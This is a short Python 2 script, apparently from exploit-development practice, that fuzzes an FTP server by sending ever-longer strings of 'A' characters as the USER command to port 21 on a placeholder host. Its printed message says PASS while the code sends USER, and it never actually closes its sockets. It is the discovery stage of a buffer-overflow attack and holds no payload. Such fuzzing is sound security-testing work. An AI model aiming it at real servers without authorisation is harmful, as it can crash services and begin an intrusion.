#!/usr/bin/python
import socket

buffer=["A"]
contador = 100
while len(buffer) <= 1000:
	buffer.append("A"*contador)
	contador=contador+200

for string in buffer:
	print "Fuzzing em PASS com %s bytes" %len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("host",21))
	s.recv(1024)
	s.send("USER "+string+"\r\n")
	s.recv(1024)
	s.close
